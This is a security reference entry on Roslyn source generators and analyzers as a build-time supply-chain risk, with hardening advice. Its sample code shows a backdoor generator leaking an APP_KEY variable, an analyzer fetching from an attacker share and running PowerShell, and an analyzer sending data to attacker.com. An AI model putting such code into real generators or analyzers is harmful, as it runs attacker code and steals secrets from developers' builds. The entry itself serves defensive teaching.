---
source: "languages/csharp/dotnet-roslyn-security.md"
title: "🟡 Roslyn Compiler Platform Security"
category: "language-vuln"
language: "csharp"
severity: "medium"
tags: [analyzer, csharp, does, generator, language-vuln, permission, roslyn, security, source, what]
---

# 🟡 Roslyn Compiler Platform Security

## What Is It?

Roslyn is .NET's open-source C# and VB compiler platform. Its APIs enable:
- **Source Generators**: Code generation at compile time
- **Analyzers**: Code analysis and error detection
- **Code Fixes**: Automatic fix suggestions

Since these tools run **inside** the compilation process, security vulnerabilities affect the entire build process.

## How Does It Appear in Vibe Coding?

```
Prompt: "Write a source generator for logging"
AI: "Creates a generator that reads from a static file and generates code — 
     But if you don't control that file, it becomes a supply chain attack!"
```

## Source Generator Security Risks

### 1. Supply Chain Attack via Source Generators

Source Generators run with **full trust** at compile time. A malicious NuGet package can add a backdoor via a source generator.

```csharp
// 💀 DANGEROUS — Malicious Source Generator
[Generator]
public class BackdoorGenerator : IIncrementalGenerator
{
    public void Initialize(IncrementalGeneratorInitializationContext context)
    {
        context.RegisterPostInitializationOutput(ctx =>
        {
            // Generates backdoor code at compile time
            ctx.AddSource("Backdoor.g.cs", @"
namespace Compromised
{
    public static class Backdoor
    {
        static Backdoor() 
        {
            // Exfiltrate environment variables
            System.IO.File.WriteAllText(
                ""C:\\windows\\temp\\exfil.txt"",
                System.Environment.GetEnvironmentVariable(""APP_KEY"")
            );
        }
    }
}");
        });
    }
}
```

**Source:** https://stevetalkscode.co.uk/sourcegeneratorattacks
**Supply Chain Attack Demo:** https://blog.maartenballiauw.be/posts/2021-05-05-building-a-supply-chain-attack-with-dotnet-nuget-dns--source-generators-and-more/

### 2. Arbitrary Code Execution During Build

When the Roslyn compiler runs **analyzer and source generators**, it executes user code. This can lead to RCE at compile time.

```csharp
// 💀 DANGEROUS — RCE inside Analyzer
public class MaliciousAnalyzer : DiagnosticAnalyzer
{
    public override void Initialize(AnalysisContext context)
    {
        context.RegisterCompilationStartAction(ctx =>
        {
            // File system access at compile time
            var data = System.IO.File.ReadAllText("\\\\attacker\\share\\payload.dll");
            
            // Process.Start() — code execution at compile time
            System.Diagnostics.Process.Start("powershell", 
                "-Command \"Invoke-Expression 'malicious code'\"");
        });
    }
}
```

According to Roslyn's security model, the compiler (csc) **executes user code** and the "no security bug in Roslyn" approach is not correct — the real risk lies in third-party analyzers/source generators.

**Discussion:** https://github.com/dotnet/roslyn/discussions/56347

### 3. Information Leakage via Analyzer

```csharp
[DiagnosticAnalyzer(LanguageNames.CSharp)]
public class ExfilAnalyzer : DiagnosticAnalyzer
{
    public override void Initialize(AnalysisContext context)
    {
        context.RegisterSymbolAction(ctx =>
        {
            var symbol = ctx.Symbol;
            // Collect information like environment variables, file paths
            var info = $"Processing {symbol.Name} at {DateTime.Now}";
            
            // DNS exfiltration
            var exfilUrl = $"https://attacker.com/exfil?data={info}";
            using var client = new System.Net.Http.HttpClient();
            client.GetAsync(exfilUrl);  // Runs in the background
        }, SymbolKind.NamedType);
    }
}
```

## Analyzer Permission Levels

| Permission | What They Can Do |
|------------|------------------|
| **Syntax Tree Analysis** | Reads code structure, harmless |
| **Symbol Analysis** | Accesses type information, medium risk |
| **Code Generation** | Creates new files, **HIGH RISK** |
| **File I/O** | File system read/write, **CRITICAL** |
| **Process Execution** | Process spawning, **VERY CRITICAL** |
| **Network Access** | HTTP calls, **VERY CRITICAL** |

## Roslyn Security Best Practices

### Safe Source Generator

```csharp
// ✅ SAFE — Code generation based only on syntax structure
[Generator]
public class SafeGenerator : IIncrementalGenerator
{
    public void Initialize(IncrementalGeneratorInitializationContext context)
    {
        context.RegisterPostInitializationOutput(ctx =>
        {
            // NO file reading/writing
            // NO process spawning
            // NO network calls
            ctx.AddSource("Helpers.g.cs", @"
namespace Generated
{
    public static class Helpers
    {
        public static string SafeValue => ""configured"";
    }
}");
        });
    }
}
```

### NuGet Package Verification

Package-signature enforcement is configured in **nuget.config**, not via MSBuild
properties (`RestoreSignedPackages` / `TrustedSigners` do not exist). Set
`signatureValidationMode` to `require` and declare `<trustedSigners>`:

```xml
<!-- ✅ SAFE — nuget.config: only allow packages signed by trusted signers -->
<configuration>
  <config>
    <!-- 'require' rejects any package not signed by a trusted signer -->
    <add key="signatureValidationMode" value="require" />
  </config>
  <trustedSigners>
    <author name="microsoft">
      <certificate fingerprint="3F9001EA83C560D712C24CF213C3D312CB3BFF51EE89435D3430BD06B5D0EECE"
                   hashAlgorithm="SHA256" allowUntrustedRoot="false" />
    </author>
    <repository name="nuget.org" serviceIndex="https://api.nuget.org/v3/index.json">
      <certificate fingerprint="0E5F38F57DC1BCC806D8494F4F90FBCEDD988B46760709CBEEC6F4219AA6157D"
                   hashAlgorithm="SHA256" allowUntrustedRoot="false" />
    </repository>
  </trustedSigners>
</configuration>
```

### Analyzer Firewall

```xml
<!-- Only allow trusted analyzers -->
<ItemGroup>
  <Analyzer Remove="*\**" />
  <Analyzer Include="$(NuGetPackageRoot)\microsoft\*\analyzers\**\*.dll" 
            Condition="'$(Configuration)'=='Release'" />
</ItemGroup>
```

## References

- https://github.com/dotnet/roslyn/discussions/56347
- https://stevetalkscode.co.uk/sourcegeneratorattacks
- https://blog.maartenballiauw.be/posts/2021-05-05-building-a-supply-chain-attack-with-dotnet-nuget-dns--source-generators-and-more/
- https://learn.microsoft.com/en-us/dotnet/csharp/roslyn-sdk/
- https://medium.com/c-sharp-programming/how-i-built-a-net-security-scanner-without-a-security-team-and-blocked-90-of-vulnerabilities-ac0803ef5bea
